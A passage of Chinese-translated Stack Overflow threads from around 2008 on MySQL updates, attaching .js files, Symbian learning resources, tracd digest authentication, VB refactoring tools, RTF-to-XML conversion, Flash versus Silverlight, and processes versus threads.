UPDATE products SET products_ordered = (
    SELECT SUM(products_quantity) 
    FROM orders_products 
    WHERE products_id = products.products_id
); 
```

或者：

```
Create temporary table my_temp_table
as
SELECT products_id, SUM(products_quantity) as total 
FROM orders_products 
GROUP BY products_id 

UPDATE products, my_temp_table
SET products.products_ordered = my_temp_table.total 
WHERE products.products_id = my_temp_table.products_id 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T15:32:08.350

当我曾经使用不支持子查询或多表更新的 MySQL 时，我使用了一个技巧来完成您所描述的操作。运行结果本身就是 SQL 语句的查询，然后保存输出并将其作为 SQL 脚本运行。

```
SELECT CONCAT( 
  'UPDATE products SET products_ordered = ', 
   SUM(products_quantity), 
  ' WHERE product_id = ', products_id, ';') AS sql_statement
FROM orders_products
GROUP BY products_id; 
```

顺便说一句，据我所知，没有这样的版本 MySQL 3.5.x。我想你可能报错了。否则，您正在使用其他产品，例如 mSQL。

**编辑：**我忘记在上面查询生成的 SQL 语句中添加分号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T08:59:52.043

MySQL <= 4.0.4 不支持多表更新 我强烈建议您将服务器更新到 MySQL 5.0.xx

# javascript - 如何使用 .js 文件？

> ID：200439
> 
> 赞同：9
> 
> 时间：2008-10-14T08:59:00.483
> 
> 标签：javascript

对于这个非常新奇的问题，我很抱歉，我对 Web 开发并不感兴趣。我将这个很酷的 JavaScript 保存在一个 .js 文件中，我们想在一个小型网站上使用它。（这是一个在其上运行 Cooliris 的脚本）。

如何使用 .js 文件或将其附加到我的 HTML 代码？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2008-10-14T09:03:51.130

只需在 HTML 页面中的任何位置包含此行：

```
<script type="text/javascript" src="yourfile.js"></script> 
```

不要忘记结束标签，因为 IE 不会在没有单独的结束标签的情况下识别它。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-14T09:02:31.240

```
<script type="text/javascript" src="myfile.js"></script> 
```

通常插入 <head> 标签中。之后，这取决于您的脚本是否需要额外的初始化或自定义才能工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T10:07:26.273

在此页面上查看源代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2011-11-12T05:30:28.503

将此脚本与头标签一起使用。您的JS文件路径与您的文件名称一起使用

```
<html>
  <head>
     <script type="text/javascript" src="url+yourfilename.js"></script>
  </head>
</html> 
```

# embedded - Symbian/嵌入式编程学习的起点

> ID：200441
> 
> 赞同：6
> 
> 时间：2008-10-14T08:59:34.150
> 
> 标签：embedded, symbian

我对 C++（不是 C）有很好的了解，最近买了一部基于 Symbian 的手机。这让我有理由开始学习如何为这只野兽编程。

我搜索了 Symbian 编程教程，但知识太多，很难选择最适合启动的。

所以我在寻求提示，关于从哪里开始嵌入式/Symbian 编程学习的提示，这些提示可以让我在这个主题中快速开始；特别是如果你自己有这方面的知识。

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-01T13:24:45.997

我将仅指出我在踏上成为 Symbian 开发人员的旅程时使用的一些资源。

1.  Symbian 开发者门户的[学习中心](http://developer.symbian.com/main/learning/)。那里有各种形式的文档、白皮书和教程，可帮助您快速了解 Symbian 内部结构和应用程序开发。此外，您最终必须从那里获得 Symbian SDK 和开发工具。
2.  [诺基亚论坛](http://www.forum.nokia.com/)
3.  [NewLC.com](http://www.newlc.com/)一个蓬勃发展且非常有帮助的 Symbian 开发人员社区。它经常更新。
4.  我很高兴获得[Accredited Symbian Developer Primer](http://www.amazon.co.uk/Accredited-Symbian-Developer-Primer-Fundamentals/dp/0470058277)这本书。尽管它没有深入研究任何事物的深处，但在一个非常小的空间里，它非常出色地解释了一些最基本和最难掌握的概念。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-06-04T16:52:32.320

Symbian 开发者网站自 Symbian Foundation 推出以来已经更新，现在处于公测阶段：[https ://developer.symbian.org/](https://developer.symbian.org/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T09:12:41.377

有这个网站：[http](http://www.symbiantutorial.org) ://www.symbiantutorial.org对 Symbian C++ 有很好的评论。如果你想继续使用 C++，我相信这就是起点。

你也可以试试[PyS60](http://sourceforge.net/projects/pys60)，它是一个用于 Symbian 60 设备的 Python，非常简洁而且很好上手。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-21T22:23:38.047

您是最近的 Symbian Press 书籍的确切目标读者： [http ://www.quickrecipesonsymbianos.com](http://www.quickrecipesonsymbianos.com)

它旨在为以前没有针对手机的开发人员介绍 Symbian 开发生态系统。它应该在你学习曲线的前两周逐步指导你，并告诉你在那之后要去哪里。

对不起，无耻的插件，只是你准确地描述了这本书的目的。希望它会帮助您完成您的要求。

# python - 追踪领域

> ID：200447
> 
> 赞同：6
> 
> 时间：2008-10-14T09:01:54.627
> 
> 标签：python, project-management, wiki, trac

我正在尝试为我目前正在进行的项目设置 tracd。[使用站点](http://trac.edgewall.org/wiki/TracStandalone)中提供的 python 脚本创建密码文件后，我尝试启动服务器并启用身份验证。但它会抛出警告说在该领域中找不到用户。实际上是什么领域 - 我尝试使用 trac 作为值，也尝试将其留空。我正在使用 Windows XP。我正在使用 Tracd 独立服务器。

发送的命令行是： tracd --port 8000 --auth=My_Test_Project,D:\My_Test_Project\Documents\Trac\digest.txt,Trac D:\My_Test_Project\Documents\Trac

警告消息是 - '警告：在领域中找不到用户：trac'

谢谢...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-14T10:47:31.170

用下面的命令行替换上述命令行会有所帮助。

tracd --port 8000 --auth=Trac,D:\My_Test_Project\Documents\Trac\digest.txt,Trac D:\My_Test_Project\Documents\Trac

--auth= 后面的字符串应该是环境名称而不是项目名称。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2010-10-02T01:46:59.950

检查您的密码摘要文件。看看我的，似乎输出存储为一行，其中包含以下格式的三个字段：`username:realm:passwordhash`. 如果您收到该警告，则可能是摘要文件中的领域字段与您在启动 tracd 时传入的领域不匹配。

* * *

查看 python 生成器脚本有三个选项：

*   -u 代表用户
*   -p 密码
*   -r 代表领域

当我使用此命令行生成摘要文件时（假设您将其命名为 trac-digest.py）：

```
python trac-digest.py -u user -p pass >> digest.txt 
```

它在我的 digest.txt 中生成这一行：

```
user:trac:1d395970d2a9a075d0536a4d6e4d0679 
```

所以看起来默认领域是*trac*并且使用指定的 --auth 选项启动 tracd 就像文档说总是给我警告'警告：在领域中找不到用户：*领域*'但是当我使用 -r 参数生成我的摘要文件时：

```
python trac-digest.py -u user -p pass -r realm >> digest.txt 
```

它在我的 digest.txt 中生成这一行：

```
user:realm:1d395970d2a9a075d0536a4d6e4d0679 
```

当我指定传递给 trac-digest.py 的领域时，我不再收到该警告。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T21:07:02.980

提到的文字说您必须将领域名称指定为“trac”，而不是“ **T** rac”，但我没有机会测试这是否有任何区别，抱歉。

# vb.net - Visual Studio 2005 for VB 中的重构功能

> ID：200457
> 
> 赞同：5
> 
> 时间：2008-10-14T09:06:23.543
> 
> 标签：vb.net, visual-studio, refactoring, add-in

有人知道 Visual Studio 2005 的一个很好的免费插件，可以在 VB 中获得重构功能吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-14T09:24:51.587

这个问题的默认答案可能是[*重构！*](http://msdn.microsoft.com/en-us/vbasic/bb693327.aspx)因为这个工具也被微软认可为“官方”的 VB 重构插件。然而，作为一款免费工具，它远不及其他商业工具（如 ReSharper 或[Refactor）的强大功能！临](http://www.devexpress.com/Products/Visual_Studio_Add-in/Refactoring/)。

顺便说一句：虽然我肯定会建议尝试所有这些工具，但也必须说它们使 IDE 变得*非常非常*慢。如果您的机器速度足够快，可以处理它，请继续享受额外的生产力提升。但是，我目前没有使用这些工具中的任何一个（尽管我花钱购买了 Refactor! Pro 订阅），因为我的（虚拟）机器无法处理负载。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T09:15:26.800

我不能推荐一个免费的，但[ReSharper](http://www.jetbrains.com/resharper/)会做到这一点。如果您不打算将其用于商业工作，则需要花费很多钱。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T09:41:58.493

我还必须补充一点，您必须小心使用 Resharper for VB，尤其是 2005 版 (R# 3.1)。Resharper 的 VB 版本远不如 C# 版本完整，尤其是在 2005 版本中。在 2008 版本 (R# 4.1) 中，差异要小一些。但还是不一样。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T10:59:26.090

感谢您的回答！

我试过重构！来自 Developer Express，它对我来说很好用。

我发现有趣的一件事是，微软最初[从 Visual Studio 2005 中取消了对 VB 重构的支持](http://blogs.msdn.com/vbteam/archive/2004/10/29/249816.aspx)，依靠第三方供应商将其作为插件提供，这是非常典型的。
奇怪的是，他们后来[与 Developer Express 合作，](http://msdn.microsoft.com/en-us/vbasic/bb693327.aspx)帮助他们开发 Refactor！对于 Visual Studio 2005。这种伙伴关系似乎在 Visual Studio 2008 的开发过程中继续存在，因为在最新版本的 IDE 中仍然不支持在 VB 中进行重构。所以现在重构！已成为使用 Visual Studio 在 VB 中进行重构的“官方”（Microsoft 支持的别名）工具。
在这一点上，我认为该功能永远不会在 IDE 中构建，所以我想知道为什么它不与 Visual Studio 安装包一起分发，就像其他“官方”插件如 DotFuscator 或 Crystal报告。

# xml - 处理 RTF 编码文件并将它们转换为 XML 的好方法是什么？

> ID：200462
> 
> 赞同：8
> 
> 时间：2008-10-14T09:09:03.490
> 
> 标签：xml, regex, perl, rtf

我从来没有做过大量的 RTF 处理，我总是使用一个库来读取或生成一个，那是很久以前的事了。现在我需要再次熟悉该格式，并最终将其转换为 XML。

你能推荐一个好的方法来做到这一点，以便我对如何解析和处理 RTF 块有很大的控制权吗？

最初，我认为 Perl 加上一些好的库是一个不错的选择，但欢迎所有意见。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T09:16:08.530

[RTF 手册](http://rtf2xml.sourceforge.net/docs/index.html)? 不过说真的，一个快速的谷歌会出现各种各样的工具和库。为什么要重新发明轮子？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-22T10:17:32.927

ScroogeXHTML 是一个 RTF 到 HTML / XHTML 转换的库，可用于 Java(tm) 平台和 Delphi。此页面上提供了 API 的演示版本和在线文档：

[http://www.mikejustin.com/](http://www.mikejustin.com/)

或者

[http://www.betabeans.de/](http://www.betabeans.de/)

# flash - 在线游戏：Macromedia Flash 或 Microsoft Silverlight，为什么？

> ID：200467
> 
> 赞同：7
> 
> 时间：2008-10-14T09:12:42.250
> 
> 标签：flash, silverlight

哪种技术堆栈最适合创建二维 MMORPG，为什么？

这个问题已经加载了，那么在这样的领域中，您会考虑哪些主要因素进行开发？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-10-14T09:25:44.563

我以开发 Flash 为生，所以我的回答应该持保留态度。我推荐 Flash 的原因如下：

1.  安装基础的大小。我没有 Silverlight 的数字，但 Flash 9（最新的非 alpha 版本）[超过 90%](http://www.adobe.com/products/player_census/flashplayer/version_penetration.html)。
2.  [Air](http://www.adobe.com/products/air/)允许您在多个平台上部署到桌面，只需对您的在线代码进行少量更改。这再次增加了您的潜在市场。
3.  社区规模。Flash 存在的时间要长得多，并且有一个*庞大*的社区正在开发库，可以满足您从动画到 3d 再到物理的大部分内容。想想您遇到的数百（或数千）个 Flash 游戏。如果您使用 Flash，您将获得更好的体验。我在谷歌上搜索了[Flash MMORPG 教程](http://www.google.com/search?q=flash%20mmorpg%20tutorial)，现在有很多结果可以让你开始。
4.  Flash 播放器的性能在测试中等于或高于 Silverlight。（请参阅[Bubblemark](http://bubblemark.com/)和[GuiMark](http://www.craftymind.com/guimark/)）。

不久前我做了一个简单的比较，我建议你也这样做。尽可能找到*最好*的Silverlight 示例。然后找到*最好*的Flash 示例。当您将它们相互比较时，我认为最好的平台变得显而易见。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-15T19:20:10.213

好的，所以蒂姆在这个问题上叫我出来，这是一个棘手的问题。除非我使用其他人的引擎来完成繁重的工作，否则我不会在 Flash 中做如此庞大的事情，我无法想象自己编写所有这些。当然，在 Silverlight 中，这也是一项艰巨的任务。

让我首先讨论一下詹姆斯关于他为什么会选择 Flash 的观点。

> 1.安装基地的大小。我没有 Silverlight 的数字，但 Flash 9（最新的非 alpha 版本）超过 90%。

我真的不认为这是一个问题，如果人们想玩你的 MMO，他们会花 20 秒来安装他们需要的东西。

> 2.Air允许您在多个平台上部署到桌面，只需对您的在线代码进行少量更改。这再次增加了您的潜在市场。

同意，我希望 Silverlight 能够独立运行。当然，我不明白为什么你会在浏览器中想要一个 MMO，所以我不能过多争论。

> 3.社区规模。Flash 存在的时间要长得多，并且有一个庞大的社区正在开发库，可以满足您从动画到 3d 再到物理的大部分内容。想想您遇到的数百（或数千）个 Flash 游戏。如果您使用 Flash，您将获得更好的体验。我在谷歌上搜索了 Flash MMORPG 教程，现在有很多结果可以让你开始。

是的，Flash 现在肯定有更多可以提供帮助的第三方内容。

> 4.Flash播放器的性能测试等于或高于Silverlight。（请参阅 Bubblemark 和 GuiMark）。

GuiMark 是一个奇怪的测试，因为它会调整所有文本的大小，如果您删除 Silverlight 会更快，并且您多久调整一次需要重新计算换行的 TextBlock 的大小？

我会担心的一个问题是保护在客户端和服务器之间来回传输的数据流，这是一个主要问题，对于 MMO 来说可能更重要，因为有人可以开发一个理解数据并可以颠覆游戏动态的机器人.

我一直在 XNA 论坛上看到关于人们想要创建 MMO 的问题，我只需要问你是否真的了解真正构建 MMO 需要付出多少努力。

最后，无论如何，很多更难的代码都在服务器上，如果你做对了，客户端技术并不重要，但我个人认为 Visual Studio 是一个更有生产力的环境，尤其是在调试时，如果你的服务器是使用 .NET 那么您将能够在单个会话中调试客户端和服务器。

我认为 Flash 具有优势的一个领域是图形方面，如果您想为照明、咒语等做一些位图效果，那么 Flash 现在具有出色的功能。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-17T02:12:58.290

作为同时参与商业 Flash 和 Silverlight 游戏的人，我是第一个说“最佳”是非常主观的人。平台围栏的两边都有激情，两种技术都有自己的优势。

如果您是游戏开发的新手，那么就开发人员可用的示例和框架的数量而言，Flash 会胜出。我们需要更多的人，比如 Bill Reiss、Mike Snow 和 Andy Beaulieu，展示游戏开发技术可以做些什么。

我认为在 Silverlight 中编写游戏后端不那么令人沮丧的一件事是工具。Visual Studio 是一款出色的开发工具，让跨平台测试变得轻而易举。这在很大程度上与您的才能有关，但我看到 Flash 项目仅仅试图调试缺陷就花费了大量预算。我相信使用像 Visual Studio 这样的成熟工具，我们可以用更少的努力隔离这些缺陷。

我相信我们在决定技术时经常忘记考虑的一件事是资源。对于一个负责寻找优秀 Flash 人才的人来说，组建一支深厚的 AS3 或 Flex 团队非常困难/昂贵。如果是针对单个项目，情况会更糟。很多人会不同意我的观点，但我发现找几个熟练的 .NET 开发人员，将他们与优秀的交互式开发人员配对，并教他们如何构建游戏，然后找到经验丰富的 Flash 要容易得多游戏开发者，并在游戏完成后让他们忙碌。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-11-04T18:10:48.460

Microsoft 是设计师领域的新手。相比之下，Adobe 在开发人员工具领域是绿色的。

您的商店里到处都是艺术家或开发人员吗？您更需要哪些工具？您的核心能力将决定使用哪个。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2010-01-19T11:33:09.363

使用 XNA，您可以使用 silverlight 开发您的游戏并在您的 PC、XBOX、Zune 和 Web 上进行游戏，只需极少的更改。所以我在 XNA (Silverlight)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T09:17:10.947

作为一个 .Net 人，我会说 Silverlight。

*   作为一个游戏，速度很重要，所以.Net 的 JIT 编译是一个奖励。我不确定 ActionScript 是否已编译。
*   许多可用于 .Net 的库，面向游戏开发。例如，您可以为 XNA 框架实现自定义 GraphicsDevice，并使用它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-14T09:19:32.160

如果我是你，我会看看你自己的技能并决定你会更好地发展什么。

在纯粹的非技术方面，Flash 目前的市场份额比 Silverlight 高得多。

关于 Silverlight / WPF 的一件事是没有直接的方法可以在屏幕上绘图，您必须创建一个对象，然后将其添加到父控件。这使得进行自定义绘图非常痛苦。但是，flash 有一个图形对象，因此您可以手动在任何精灵上绘制。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-15T18:57:53.987

一些 Silverlight 内容的好资源是 Bill Reiss，我想他会跳到这里。他有休闲游戏的经验。还可以查看[http://www.ltbennett.com](http://www.ltbennett.com)了解 Silverlight 2 游戏，Miniclip.com 上也有一些游戏。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-16T11:07:14.530

编写 mmorpg 客户端将是一项艰巨的任务，如果您不确定，我会说在两者中学习原型将是一件非常明智的事情。它们都有优点和缺点，但最终可能两者都可以完成这项工作，因此您只需要选择您更喜欢的那个即可。

坦率地说，此类项目的绝大多数工作将是艺术资产、图形、动画、声音和“关卡”设计，我认为为客户选择平台是最不重要的部分。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2010-01-19T12:14:26.900

Flash 中的 MMORPG 客户端？它已经完成了，比如说，六年。看[多福斯](http://www.dofus.com)！

# multithreading - 进程和线程有什么区别？

> ID：200469
> 
> 赞同：1873
> 
> 时间：2008-10-14T09:13:24.247
> 
> 标签：multithreading, process, operating-system

进程和线程之间的技术区别是什么？

我觉得像“进程”这样的词被过度使用了，而且还有硬件和软件线程。[像Erlang](http://en.wikipedia.org/wiki/Erlang_%28programming_language%29)这样的语言中的轻量级进程怎么样？是否有明确的理由使用一个术语而不是另一个？

* * *

## 回答 #1

> 赞同：1642
> 
> 时间：2008-10-14T09:15:58.967

进程和线程都是独立的执行序列。典型的区别是（同一进程的）线程在共享内存空间中运行，而进程在不同的内存空间中运行。

我不确定您可能指的是什么“硬件”与“软件”线程。线程是一种操作环境特性，而不是 CPU 特性（尽管 CPU 通常具有使线程高效的操作）。

Erlang 使用术语“进程”是因为它没有公开共享内存多道程序模型。称它们为“线程”意味着它们具有共享内存。

* * *

## 回答 #2

> 赞同：912
> 
> 时间：2008-10-14T09:43:50.423

**进程**
每个进程都提供执行程序所需的资源。进程具有虚拟地址空间、可执行代码、系统对象的打开句柄、安全上下文、唯一进程标识符、环境变量、优先级、最小和最大工作集大小以及至少一个执行线程。每个进程都从一个线程开始，通常称为主线程，但可以从它的任何线程创建额外的线程。

**线程**
线程是进程中可以调度执行的实体。一个进程的所有线程共享它的虚拟地址空间和系统资源。此外，每个线程都维护异常处理程序、调度优先级、线程本地存储、唯一线程标识符以及系统将用于保存线程上下文直到被调度的一组结构。线程上下文包括线程的机器寄存器集、内核堆栈、线程环境块和线程进程地址空间中的用户堆栈。线程也可以有自己的安全上下文，可用于模拟客户端。

* * *

此信息可在此处的 Microsoft Docs 中找到：[**关于进程和线程**](https://docs.microsoft.com/en-gb/windows/win32/procthread/about-processes-and-threads?redirectedfrom=MSDN)

> Microsoft Windows 支持抢占式多任务处理，这会产生从多个进程同时执行多个线程的效果。在多处理器计算机上，系统可以同时执行与计算机上的处理器一样多的线程。

* * *

## 回答 #3

> 赞同：333
> 
> 时间：2010-03-19T14:17:23.617

**过程：**

*   程序的执行实例称为进程。
*   一些操作系统使用术语“任务”来指代正在执行的程序。
*   进程始终存储在主存储器中，也称为主存储器或随机存取存储器。
*   因此，进程被称为活动实体。如果机器重新启动，它就会消失。
*   几个进程可能与同一个程序相关联。
*   在多处理器系统上，可以并行执行多个进程。
*   在单处理器系统上，虽然没有实现真正的并行性，但应用了进程调度算法，并且处理器被调度为一次执行每个进程，从而产生并发错觉。
*   **示例：**执行“计算器”程序的多个实例。每个实例都称为一个进程。

**线：**

*   线程是进程的子集。
*   它被称为“轻量级进程”，因为它类似于实际进程，但在进程的上下文中执行并共享内核分配给进程的相同资源。
*   通常，一个进程只有一个控制线程——一次执行一组机器指令。
*   一个进程也可以由同时执行指令的多个执行线程组成。
*   多线程控制可以利用多处理器系统上可能的真正并行性。
*   在单处理器系统上，应用了线程调度算法，处理器被调度为一次运行每个线程。
*   在一个进程中运行的所有线程共享相同的地址空间、文件描述符、堆栈和其他与进程相关的属性。
*   由于进程的线程共享相同的内存，同步访问进程内的共享数据变得前所未有的重要。

[**我从知识探索**](http://web.archive.org/web/20100807021758/http://kquest.co.cc/2010/03/program-process-task-thread)中借用了上述信息！[**博客**](http://web.archive.org/web/20100807021758/http://kquest.co.cc/2010/03/program-process-task-thread)。

* * *

## 回答 #4

> 赞同：169
> 
> 时间：2013-10-22T12:42:55.327

首先，让我们看一下理论方面。您需要从概念上了解进程是什么，以了解进程和线程之间的区别以及它们之间共享的内容。

我们在Tanenbaum的第*2.2.2节*[现代操作系统 3e](https://rads.stackoverflow.com/amzn/click/com/0136006639)的经典线程模型中有以下内容：

> 流程模型基于两个独立的概念：资源分组和执行。有时将它们分开是有用的；这就是线程进来的地方......

他继续：

> 查看流程的一种方式是，它是将相关资源组合在一起的一种方式。进程具有包含程序文本和数据以及其他资源的地址空间。这些资源可能包括打开的文件、子进程、待处理的警报、信号处理程序、会计信息等。通过将它们以流程的形式组合在一起，可以更轻松地对其进行管理。进程的另一个概念是执行线程，通常简称为线程。该线程有一个程序计数器，用于跟踪接下来要执行的指令。它有寄存器，保存它当前的工作变量。它有一个堆栈，其中包含执行历史记录，每个调用但尚未返回的过程有一帧。虽然线程必须在某个进程中执行，线程及其进程是不同的概念，可以分开处理。流程用于将资源组合在一起；线程是计划在 CPU 上执行的实体。

再往下，他提供了下表：

```
Per process items             | Per thread items
------------------------------|-----------------
Address space                 | Program counter
Global variables              | Registers
Open files                    | Stack
Child processes               | State
Pending alarms                |
Signals and signal handlers   |
Accounting information        | 
```

让我们处理[硬件多线程](https://en.wikipedia.org/wiki/Multithreading_%28computer_architecture%29)问题。传统上，CPU 将支持单个执行线程，通过单个[程序计数器](https://en.wikipedia.org/wiki/Program_counter)(PC) 和一组寄存器来维护线程的状态。但是当缓存未命中时会发生什么？从主内存中获取数据需要很长时间，而此时 CPU 只是闲置在那里。所以有人想基本上拥有两组线程状态（PC + 寄存器），以便另一个线程（可能在同一个进程中，可能在不同的进程中）可以在另一个线程在主内存上等待时完成工作。这个概念有多种名称和实现方式，例如[超线程](https://en.wikipedia.org/wiki/Hyper-threading)和[同时多线程](https://en.wikipedia.org/wiki/Multithreading_%28computer_architecture%29)（简称SMT）。

现在让我们看看软件方面。基本上有三种方式可以在软件端实现线程。

1.  用户空间线程
2.  内核线程
3.  两者的结合

实现线程所需的只是保存 CPU 状态和维护多个堆栈的能力，这在许多情况下可以在用户空间中完成。用户空间线程的优势是超快速的线程切换，因为您不必陷入内核，并且能够按照您喜欢的方式调度线程。最大的缺点是无法进行阻塞 I/O（这将阻塞整个进程及其所有用户线程），这是我们首先使用线程的重要原因之一。在许多情况下，使用线程阻塞 I/O 极大地简化了程序设计。

除了将所有调度问题留给操作系统之外，内核线程还具有能够使用阻塞 I/O 的优势。但是每个线程切换都需要陷入内核，这可能相对较慢。但是，如果您因为 I/O 阻塞而切换线程，这并不是真正的问题，因为 I/O 操作可能已经将您困在内核中。

另一种方法是将两者结合起来，多个内核线程每个都有多个用户线程。

所以回到你的术语问题，你可以看到进程和执行线程是两个不同的概念，你选择使用哪个术语取决于你在说什么。关于“轻量级进程”这个术语，我个人并不认为其中有什么意义，因为它并没有真正传达正在发生的事情以及“执行线程”这个术语。

* * *

## 回答 #5

> 赞同：140
> 
> 时间：2012-12-24T07:04:28.750

更多关于并发编程的解释

1.  一个进程有一个独立的执行环境。一个进程通常有一套完整的、私有的基本运行时资源；特别是，每个进程都有自己的内存空间。

2.  线程存在于进程中——每个进程至少有一个。线程共享进程的资源，包括内存和打开的文件。这有助于高效但可能存在问题的沟通。

一个让普通人记住的例子：

在您的计算机上，打开 Microsoft Word 和 Web 浏览器。我们称这两个*过程*。

在 Microsoft Word 中，您键入内容会自动保存。现在，您已经观察到编辑和保存是并行进行的——在一个线程上编辑并在另一个线程上保存。

* * *

## 回答 #6

> 赞同：57
> 
> 时间：2008-10-14T09:16:13.600

> 一个应用程序由一个或多个进程组成。用最简单的术语来说，一个进程就是一个正在执行的程序。一个或多个线程在进程的上下文中运行。线程是操作系统分配处理器时间的基本单位。线程可以执行进程代码的任何部分，包括当前正在由另一个线程执行的部分。纤程是必须由应用程序手动调度的执行单元。纤维在调度它们的线程的上下文中运行。

[从这里](http://msdn.microsoft.com/en-us/library/ms684841(VS.85).aspx)偷来的。

* * *

## 回答 #7

> 赞同：43
> 
> 时间：2008-10-14T09:30:19.873

进程是代码、内存、数据和其他资源的集合。线程是在进程范围内执行的代码序列。您可以（通常）在同一个进程中同时执行多个线程。

* * *

## 回答 #8

> 赞同：39
> 
> 时间：2017-09-01T04:49:24.933

**过程：**

1.  过程是一个重量级的过程。
2.  进程是一个独立的程序，具有独立的内存、数据、资源等。
3.  进程是使用 fork() 方法创建的。
4.  进程之间的上下文切换非常耗时。

示例：
比如说，打开任何浏览器（mozilla、Chrome、IE）。此时新进程将开始执行。

**主题：**

1.  线程是轻量级进程。线程捆绑在进程内部。
2.  线程具有共享内存、数据、资源、文件等。
3.  线程是使用 clone() 方法创建的。
4.  线程之间的上下文切换并不像 Process 那样耗时。

* * *

## 回答 #9

> 赞同：31
> 
> 时间：2016-12-06T23:24:18.923

**进程和线程的真实世界示例** *这将为您提供有关线程和进程的基本概念* [![在此处输入图像描述](https://i.stack.imgur.com/xJXNS.png)](https://i.stack.imgur.com/xJXNS.png)

*我从 Scott Langham 的答案中借用了上述信息*- 谢谢

* * *

## 回答 #10

> 赞同：27
> 
> 时间：2013-08-09T20:28:24.247

*   每个进程都是一个线程（主线程）。
*   但是每个线程都不是一个进程。它是流程的一部分（实体）。

* * *

## 回答 #11

> 赞同：20
> 
> 时间：2008-10-14T09:29:05.977

线程和进程都是 OS 资源分配的原子单元（即有一个并发模型描述 CPU 时间如何在它们之间分配，以及拥有其他 OS 资源的模型）。有以下区别：

*   共享资源（线程根据定义共享内存，除了堆栈和局部变量之外，它们不拥有任何东西；进程也可以共享内存，但有一个单独的机制，由操作系统维护）
*   分配空间（进程的内核空间与线程的用户空间）

上面的 Greg Hewgill 对 Erlang 中“进程”这个词的含义是正确的，[这里](http://www.erlang.org/pipermail/erlang-questions/2006-October/023287.html)讨论了为什么 Erlang 可以做进程轻量级。

* * *

## 回答 #12

> 赞同：19
> 
> 时间：2018-04-17T13:29:36.247

[http://lkml.iu.edu/hypermail/linux/kernel/9608/0191.html](http://lkml.iu.edu/hypermail/linux/kernel/9608/0191.html)

> 莱纳斯·托瓦兹 (torvalds@cs.helsinki.fi)
> 
> 1996 年 8 月 6 日星期二 12:47:31 +0300 (EET DST)
> 
> 消息排序方式：[日期][线程][主题][作者]
> 
> 下一条消息：Bernd P. Ziller：“Re: Oops in get_hash_table”
> 
> 上一条消息：Linus Torvalds：“回复：I/O 请求排序”
> 
> 1996 年 8 月 5 日星期一，Peter P. Eiserloh 写道：
> 
> > 我们需要保持一个清晰的线程概念。太多人似乎将线程与进程混淆了。以下讨论并不反映 linux 的当前状态，而是试图停留在高水平的讨论。
> 
> 不！
> 
> 没有理由认为“线程”和“进程”是独立的实体。这就是传统上的做法，但我个人认为这样想是一个重大错误。这么想的唯一原因是历史包袱。
> 
> 线程和进程实际上只是一件事：“执行上下文”。试图人为地区分不同的情况只是自我限制。
> 
> “执行上下文”，在此称为 COE，只是该 COE 的所有状态的集合体。该状态包括 CPU 状态（寄存器等）、MMU 状态（页面映射）、权限状态（uid、gid）和各种“通信状态”（打开文件、信号处理程序等）。传统上，“线程”和“进程”之间的区别主要在于线程具有 CPU 状态（+可能是其他一些最小状态），而所有其他上下文都来自进程。然而，这只是 划分 COE 总状态的*一种*方式，并没有说这是正确的做法。把自己限制在那种形象上简直是愚蠢的。
> 
> Linux 考虑这一点的方式（以及我希望事情工作的方式）是*没有*“进程”或“线程”这样的东西。只有整个 COE（Linux 称为“任务”）。不同的 COE 可以相互共享其上下文的一部分，其中一个共享*子集*是传统的“线程”/“进程”设置，但这实际上应该被视为只是一个子集（它是一个重要的子集，但重要性来了不是来自设计，而是来自标准：我们显然也希望在 Linux 上运行符合标准的线程程序）。
> 
> 简而言之：不要围绕线程/进程的思维方式进行设计。内核应该围绕 COE 的思维方式设计，然后 pthreads*库*可以将有限的 pthreads 接口导出给想要使用这种看待 COE 的方式的用户。
> 
> 就像当您认为 COE 而不是线程/进程时变得可能的一个示例：
> 
> *   您可以执行外部“cd”程序，这在 UNIX 和/或进程/线程中传统上是不可能的（愚蠢的示例，但想法是您可以拥有不限于传统 UNIX 的这些类型的“模块” /线程设置）。做一个：
> 
> 克隆（CLONE_VM|CLONE_FS）；
> 
> 孩子：execve（“外部光盘”）；
> 
> /* "execve()" 将解除 VM 的关联，所以我们使用 CLONE_VM 的唯一原因是为了加快克隆操作 */
> 
> *   您可以自然地执行“vfork()”（它需要最少的内核支持，但这种支持非常适合 CUA 的思维方式）：
> 
> 克隆（CLONE_VM）；
> 
> child：继续运行，最终 execve()
> 
> 妈妈：等待执行
> 
> *   你可以做外部的“IO恶魔”：
> 
> 克隆（CLONE_FILES）；
> 
> 孩子：打开文件描述符等
> 
> 妈妈：用fd的孩子打开和vv。
> 
> 上述所有工作都是因为您不受线程/进程思维方式的束缚。例如，考虑一个 Web 服务器，其中 CGI 脚本作为“执行线程”完成。你不能用传统线程做到这一点，因为传统线程总是必须共享整个地址空间，所以你必须链接你想要在 Web 服务器本身中做的所有事情（“线程”不能运行另一个可执行文件）。
